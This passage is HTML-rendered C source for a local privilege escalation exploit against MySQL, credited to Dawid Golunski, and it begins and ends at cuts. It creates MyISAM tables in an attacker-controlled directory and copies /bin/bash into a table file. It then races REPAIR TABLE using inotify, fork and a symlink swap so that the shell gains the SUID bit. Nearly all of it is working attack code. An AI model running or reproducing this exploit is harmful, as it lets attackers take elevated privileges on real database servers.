Do no harm.\n\n"</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	<span class="token string">"Discovered/Coded by:\n\n"</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	<span class="token string">"Dawid Golunski \n"</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token string">"http://legalhackers.com"</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token string">"\033[0m\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">void</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token function">intro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage:\n\n%s user pass db_host database\n\n"</span><span class="token punctuation">,</span> argv0<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token keyword">void</span> <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sql_cmd<span class="token punctuation">,</span> <span class="token keyword">int</span> silent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    </pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>silent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>	    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s \n"</span><span class="token punctuation">,</span> sql_cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> sql_cmd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    res <span class="token operator">=</span> <span class="token function">mysql_store_result</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">mysql_free_result</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token keyword">int</span> randomnum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token keyword">int</span> io_notified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token keyword">int</span> myd_handle<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">int</span> wpid<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">int</span> is_shell_suid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>    <span class="token keyword">int</span> status<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token comment">/* io notify */</span></pre></td></tr><tr><td data-num="80"></td><td><pre>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>    <span class="token keyword">int</span> num_read<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">inotify_event</span> <span class="token operator">*</span>event<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token comment">/* credentials */</span></pre></td></tr><tr><td data-num="86"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span>user     <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span>password <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span>db_host  <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span>database <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre>    <span class="token comment">// Disable buffering of stdout</span></pre></td></tr><tr><td data-num="93"></td><td><pre>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token comment">// Get the params</span></pre></td></tr><tr><td data-num="96"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>	<span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="100"></td><td><pre>    <span class="token function">intro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>    <span class="token comment">// Show initial privileges</span></pre></td></tr><tr><td data-num="102"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Starting the exploit as: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token comment">// Connect to the database server with provided credentials</span></pre></td></tr><tr><td data-num="106"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Connecting to the database `%s` as %s@%s\n"</span><span class="token punctuation">,</span> database<span class="token punctuation">,</span> user<span class="token punctuation">,</span> db_host<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>    conn <span class="token operator">=</span> <span class="token function">mysql_init</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="108"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mysql_real_connect</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> db_host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">,</span> database<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="112"></td><td><pre></pre></td></tr><tr><td data-num="113"></td><td><pre>    <span class="token comment">// Prepare tmp dir</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Creating exploit temp directory %s\n"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/"</span> EXP_DIRN<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>    <span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp/"</span> EXP_DIRN <span class="token string">" &amp;&amp; mkdir /tmp/"</span> EXP_DIRN<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod g+s /tmp/"</span> EXP_DIRN <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre></pre></td></tr><tr><td data-num="119"></td><td><pre>    <span class="token comment">// Prepare exploit tables :)</span></pre></td></tr><tr><td data-num="120"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Creating mysql tables \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="121"></td><td><pre>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"DROP TABLE IF EXISTS exploit_table"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"DROP TABLE IF EXISTS mysql_suid_shell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre></pre></td></tr><tr><td data-num="126"></td><td><pre>    <span class="token comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span></pre></td></tr><tr><td data-num="127"></td><td><pre>    <span class="token comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span></pre></td></tr><tr><td data-num="128"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cp /bin/bash "</span> SUID_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls -l "</span> SUID_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="131"></td><td><pre></pre></td></tr><tr><td data-num="132"></td><td><pre>    <span class="token comment">// Use inotify to get the timing right</span></pre></td></tr><tr><td data-num="133"></td><td><pre>    fd <span class="token operator">=</span> <span class="token function">inotify_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="135"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed to inotify_init\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="136"></td><td><pre>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>    ret <span class="token operator">=</span> <span class="token function">inotify_add_watch</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> EXP_PATH<span class="token punctuation">,</span> IN_CREATE <span class="token operator">|</span> IN_CLOSE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre></pre></td></tr><tr><td data-num="140"></td><td><pre></pre></td></tr><tr><td data-num="141"></td><td><pre>    <span class="token comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span></pre></td></tr><tr><td data-num="142"></td><td><pre></pre></td></tr><tr><td data-num="143"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Entering the race loop... Hang in there...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="144"></td><td><pre></pre></td></tr><tr><td data-num="145"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span> is_shell_suid <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="146"></td><td><pre></pre></td></tr><tr><td data-num="147"></td><td><pre>        cnt<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="148"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>cnt <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="149"></td><td><pre>	 	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"->"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>	 	<span class="token comment">//fflush(stdout);	</span></pre></td></tr><tr><td data-num="151"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="152"></td><td><pre></pre></td></tr><tr><td data-num="153"></td><td><pre>        <span class="token comment">/* Create empty file , remove if already exists */</span></pre></td></tr><tr><td data-num="154"></td><td><pre>        <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="155"></td><td><pre>        <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="156"></td><td><pre>   	<span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"DROP TABLE IF EXISTS exploit_table"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="157"></td><td><pre>	<span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="158"></td><td><pre></pre></td></tr><tr><td data-num="159"></td><td><pre>	<span class="token comment">/* random num if needed */</span></pre></td></tr><tr><td data-num="160"></td><td><pre>        <span class="token function">srand</span> <span class="token punctuation">(</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>        randomnum <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAX_DELAY <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre></pre></td></tr><tr><td data-num="163"></td><td><pre>        <span class="token comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span></pre></td></tr><tr><td data-num="164"></td><td><pre>        pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="165"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="166"></td><td><pre>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Fork failed :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="167"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="168"></td><td><pre></pre></td></tr><tr><td data-num="169"></td><td><pre>        <span class="token comment">/* Child process - executes REPAIR TABLE  SQL statement */</span></pre></td></tr><tr><td data-num="170"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>            <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>            <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="173"></td><td><pre>	    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"REPAIR TABLE exploit_table EXTENDED"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="174"></td><td><pre>            <span class="token comment">// child stops here</span></pre></td></tr><tr><td data-num="175"></td><td><pre>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="177"></td><td><pre></pre></td></tr><tr><td data-num="178"></td><td><pre>        <span class="token comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span></pre></td></tr><tr><td data-num="179"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="180"></td><td><pre>            io_notified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="181"></td><td><pre></pre></td></tr><tr><td data-num="182"></td><td><pre>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="183"></td><td><pre>                <span class="token keyword">int</span> processed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>                ret <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>                    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="187"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="188"></td><td><pre>                <span class="token keyword">while</span> <span class="token punctuation">(</span>processed <span class="token operator">&lt;</span> ret<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="189"></td><td><pre>                    event <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inotify_event</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> processed<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token operator">-></span>mask <span class="token operator">&amp;</span> IN_CLOSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="191"></td><td><pre>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>event<span class="token operator">-></span>name<span class="token punctuation">,</span> <span class="token string">"exploit_table.TMD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="192"></td><td><pre>                            <span class="token comment">//usleep(randomnum);</span></pre></td></tr><tr><td data-num="193"></td><td><pre></pre></td></tr><tr><td data-num="194"></td><td><pre>			    <span class="token comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span></pre></td></tr><tr><td data-num="195"></td><td><pre>			    <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="196"></td><td><pre>			    myd_handle <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">,</span> O_CREAT<span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="197"></td><td><pre>			    <span class="token function">close</span><span class="token punctuation">(</span>myd_handle<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="198"></td><td><pre>			    <span class="token function">chmod</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">,</span> <span class="token number">04777</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="199"></td><td><pre></pre></td></tr><tr><td data-num="200"></td><td><pre>			    <span class="token comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span></pre></td></tr><tr><td data-num="201"></td><td><pre>                            <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="202"></td><td><pre>                            <span class="token function">symlink</span><span class="token punctuation">(</span>SUID_SHELL<span class="token punctuation">,</span> MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="203"></td><td><pre>                            io_notified<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="204"></td><td><pre>                        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="205"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="206"></td><td><pre>                    processed <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inotify_event</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="207"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="208"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span>io_notified<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="209"></td><td><pre>                    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="210"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="211"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="212"></td><td><pre></pre></td></tr><tr><td data-num="213"></td><td><pre></pre></td></tr><tr><td data-num="214"></td><td><pre>            <span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="215"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="216"></td><td><pre></pre></td></tr><tr><td data-num="217"></td><td><pre>	<span class="token comment">// Check if SUID bit was set at the end of this attempt</span></pre></td></tr><tr><td data-num="218"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">lstat</span><span class="token punctuation">(</span>SUID_SHELL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="219"></td><td><pre>	    <span class="token keyword">if</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> S_ISUID<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="220"></td><td><pre>		is_shell_suid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="221"></td><td><pre>	    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="222"></td><td><pre>        <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="223"></td><td><pre></pre></td></tr><tr><td data-num="224"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="225"></td><td><pre></pre></td></tr><tr><td data-num="226"></td><td><pre>    <span class="token function">printf</span><span class="token 